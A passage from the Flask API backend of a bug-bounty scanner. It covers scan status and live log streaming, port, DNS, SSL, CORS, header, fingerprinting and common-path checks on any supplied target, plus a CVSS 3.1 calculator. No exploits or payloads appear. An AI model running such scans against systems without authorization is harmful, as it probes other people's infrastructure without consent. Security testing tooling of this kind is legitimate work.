        add_log(scan_id, "=" * 50, "info")
        add_log(scan_id, f"🎉 SCAN COMPLETE!", "success")
        add_log(scan_id, f"📋 Total Findings: {len(all_findings)}", "info")
        add_log(scan_id, f"   🔴 Critical: {counts.get('CRITICAL', 0)}", "error")
        add_log(scan_id, f"   🟠 High: {counts.get('HIGH', 0)}", "warning")
        add_log(scan_id, f"   🟡 Medium: {counts.get('MEDIUM', 0)}", "warning")
        add_log(scan_id, f"   🟢 Low: {counts.get('LOW', 0)}", "info")
        add_log(scan_id, f"   ℹ️  Info: {counts.get('INFO', 0)}", "info")
        add_log(scan_id, "=" * 50, "info")
        
        active_scans[scan_id]["progress"] = 100
        active_scans[scan_id]["status"] = "completed"
        active_scans[scan_id]["completed"] = True
        active_scans[scan_id]["finished"] = datetime.now().isoformat()
        
    except Exception as e:
        add_log(scan_id, f"❌ Scan error: {str(e)}", "error")
        if scan_id in active_scans:
            active_scans[scan_id]["status"] = "error"
            active_scans[scan_id]["error"] = str(e)

@app.route('/api/scan/<scan_id>', methods=['GET'])
def get_scan(scan_id):
    if scan_id not in active_scans:
        return jsonify({"error": "Scan not found"}), 404
    return jsonify(active_scans[scan_id])

@app.route('/api/scan/<scan_id>/stream', methods=['GET'])
def stream_scan(scan_id):
    """Server-Sent Events stream for live scan updates"""
    def generate():
        last_log_idx = 0
        last_finding_idx = 0
        
        while True:
            if scan_id not in active_scans:
                yield f"data: {json.dumps({'error': 'Scan not found'})}\n\n"
                break
            
            scan = active_scans[scan_id]
            
            # Send new logs
            logs = scan.get("logs", [])
            if len(logs) > last_log_idx:
                for log in logs[last_log_idx:]:
                    yield f"data: {json.dumps({'type': 'log', 'data': log})}\n\n"
                last_log_idx = len(logs)
            
            # Send new findings
            findings = scan.get("findings", [])
            if len(findings) > last_finding_idx:
                for finding in findings[last_finding_idx:]:
                    yield f"data: {json.dumps({'type': 'finding', 'data': finding})}\n\n"
                last_finding_idx = len(findings)
            
            # Send progress update
            yield f"data: {json.dumps({'type': 'progress', 'progress': scan.get('progress', 0), 'phase': scan.get('phase', ''), 'status': scan.get('status', '')})}\n\n"
            
            if scan.get("completed") or scan.get("status") == "error":
                yield f"data: {json.dumps({'type': 'complete', 'scan': scan})}\n\n"
                break
            
            time.sleep(0.5)
    
    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no',
            'Access-Control-Allow-Origin': '*'
        }
    )

@app.route('/api/scan/<scan_id>/report', methods=['GET'])
def get_report(scan_id):
    if scan_id not in active_scans:
        return jsonify({"error": "Scan not found"}), 404
    
    scan = active_scans[scan_id]
    report = scan.get("poc_report", {})
    
    if not report:
        return jsonify({"error": "Report not yet generated"}), 400
    
    return jsonify(report)

@app.route('/api/scan/list', methods=['GET'])
def list_scans():
    scans = []
    for scan_id, scan in active_scans.items():
        scans.append({
            "id": scan_id,
            "target": scan.get("target"),
            "status": scan.get("status"),
            "started": scan.get("started"),
            "progress": scan.get("progress", 0),
            "findings_count": len(scan.get("findings", [])),
            "scan_type": scan.get("scan_type")
        })
    return jsonify(sorted(scans, key=lambda x: x.get("started", ""), reverse=True))

@app.route('/api/tools/dns', methods=['POST'])
def dns_lookup():
    target = (request.json or {}).get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    target = re.sub(r'^https?://', '', target).rstrip('/')
    return jsonify({"target": target, "records": resolve_target(target)})

@app.route('/api/tools/headers', methods=['POST'])
def headers_check():
    target = (request.json or {}).get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    return jsonify(check_security_headers(target))

@app.route('/api/tools/ports', methods=['POST'])
def port_scan():
    data = request.json or {}
    target = data.get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    target = re.sub(r'^https?://', '', target).rstrip('/')
    ports = scan_ports_fast(target)
    return jsonify({"target": target, "ports": ports})

@app.route('/api/tools/ssl', methods=['POST'])
def ssl_check():
    target = (request.json or {}).get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    target = re.sub(r'^https?://', '', target).rstrip('/')
    return jsonify(check_ssl_tls(target))

@app.route('/api/tools/cors', methods=['POST'])
def cors_check():
    target = (request.json or {}).get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    findings = check_cors_misconfiguration(target)
    return jsonify({"target": target, "findings": findings})

@app.route('/api/tools/fingerprint', methods=['POST'])
def fingerprint():
    target = (request.json or {}).get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    techs = fingerprint_tech(target)
    return jsonify({"target": target, "technologies": techs})

@app.route('/api/tools/paths', methods=['POST'])
def paths_check():
    target = (request.json or {}).get('target', '').strip()
    if not target:
        return jsonify({"error": "Target required"}), 400
    paths = check_common_paths(target)
    return jsonify({"target": target, "paths": paths})

@app.route('/api/cvss/calculate', methods=['POST'])
def cvss_calculate():
    data = request.json or {}
    try:
        av = data.get('AV', 'N')
        ac = data.get('AC', 'L')
        pr = data.get('PR', 'N')
        ui = data.get('UI', 'N')
        s  = data.get('S', 'U')
        c  = data.get('C', 'N')
        i  = data.get('I', 'N')
        a  = data.get('A', 'N')
        
        # CVSS 3.1 weights
        CVSS_WEIGHTS = {
            "AV": {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20},
            "AC": {"L": 0.77, "H": 0.44},
            "PR": {
                "N": {"U": 0.85, "C": 0.85},
                "L": {"U": 0.62, "C": 0.68},
                "H": {"U": 0.27, "C": 0.50},
            },
            "UI": {"N": 0.85, "R": 0.62},
            "C":  {"H": 0.56, "L": 0.22, "N": 0.00},
            "I":  {"H": 0.56, "L": 0.22, "N": 0.00},
            "A":  {"H": 0.56, "L": 0.22, "N": 0.00},
        }
        
        scope_changed = (s == "C")
        av_w = CVSS_WEIGHTS["AV"][av]
        ac_w = CVSS_WEIGHTS["AC"][ac]
        pr_w = CVSS_WEIGHTS["PR"][pr][s]
        ui_w = CVSS_WEIGHTS["UI"][ui]
        c_w  = CVSS_WEIGHTS["C"][c]
        i_w  = CVSS_WEIGHTS["I"][i]
        a_w  = CVSS_WEIGHTS["A"][a]
        
        isc_base = 1 - (1 - c_w) * (1 - i_w) * (1 - a_w)
        
        if scope_changed:
            isc = 7.52 * (isc_base - 0.029) - 3.25 * ((isc_base - 0.02) ** 15)
        else:
            isc = 6.42 * isc_base
        
        if isc <= 0:
            score = 0.0
        else:
            exploitability = 8.22 * av_w * ac_w * pr_w * ui_w
            if scope_changed:
                base_score = min(1.08 * (isc + exploitability), 10)
            else:
                base_score = min(isc + exploitability, 10)
            score = round(base_score * 10) / 10
        
        if score == 0.0:    severity = "NONE"
        elif score < 4.0:   severity = "LOW"
        elif score < 7.0:   severity = "MEDIUM"
        elif score < 9.0:   severity = "HIGH"
        else:               severity = "CRITICAL"
        
        vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"
        
        return jsonify({
            "score": score,
            "severity": severity,
            "vector": vector,
            "components": {
                "AV": av, "AC": ac, "PR": pr, "UI": ui,
                "S": s, "C": c, "I": i, "A": a
            }
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == '__main__':
    import urllib3
    urllib3.disable_warnings()
    print("[*] Bug Bounty Hunter Pro API starting...")
    print("[*] Listening on http://127.0.0.1:5000")
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True)
